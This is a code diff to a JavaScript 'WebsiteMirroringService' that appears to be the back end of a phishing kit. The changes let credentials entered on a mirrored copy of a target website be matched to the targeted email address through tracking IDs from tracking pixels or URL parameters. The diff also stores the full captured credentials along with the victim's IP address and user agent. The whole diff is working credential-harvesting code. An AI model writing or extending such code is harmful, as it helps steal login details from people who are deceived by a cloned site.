@@ -1291,8 +1291,19 @@ class WebsiteMirroringService {
    */
   async associateLoginWithEmail(sessionToken, trackingId, credentials) {
     try {
-      // First, check if we can identify the target email from the tracking ID
-      if (!trackingId) return;
+      // Check if we have a tracking ID from the parameter or from the session
+      const session = this.activeSessions.get(sessionToken);
+      if (!trackingId && session && session.trackingId) {
+        // Use the tracking ID stored with the session
+        trackingId = session.trackingId;
+        console.log(`Using stored tracking ID ${trackingId} from session`);
+      }
+      
+      // Return if we still don't have a tracking ID
+      if (!trackingId) {
+        console.log("No tracking ID available to associate login with email");
+        return;
+      }
       
       const emailInfo = await new Promise((resolve, reject) => {
         db.get(
@@ -1305,7 +1316,10 @@ class WebsiteMirroringService {
         );
       });
       
-      if (!emailInfo) return;
+      if (!emailInfo) {
+        console.log(`No email information found for tracking ID ${trackingId}`);
+        return;
+      }
       
       // Create login_attempts table if it doesn't exist
       await new Promise((resolve, reject) => {
@@ -1332,8 +1346,6 @@ class WebsiteMirroringService {
       });
       
       // Store the login attempt with the association to the target email
-      const session = this.activeSessions.get(sessionToken);
-      
       if (session) {
         await new Promise((resolve, reject) => {
           db.run(`
@@ -1350,8 +1362,8 @@ class WebsiteMirroringService {
             credentials.email || null,
             JSON.stringify(credentials),
             session.targetUrl,
-            null,  // IP address will be added on request
-            null   // User agent will be added on request
+            credentials.ip_address || null,
+            credentials.user_agent || null
           ], function(err) {
             if (err) reject(err);
             else {
@@ -1822,9 +1834,20 @@ class WebsiteMirroringService {
         [timestamp, sessionId]
       );
 
-      // Log visit with tracking ID if present
+      // If tracking ID is provided, store it with the session for later use
       if (trackingParam) {
         console.log(`Mirror access tracked with ID ${trackingParam}: Session ${sessionId}, IP: ${ip}`);
+        
+        // Find the session in memory
+        for (const [token, session] of this.activeSessions.entries()) {
+          if (session.sessionId === sessionId) {
+            // Store tracking ID with session data for later credential association
+            session.trackingId = trackingParam;
+            this.activeSessions.set(token, session);
+            console.log(`Stored tracking ID ${trackingParam} with session ${sessionId}`);
+            break;
+          }
+        }
         
         // Check if this corresponds to a tracking pixel
         db.get(
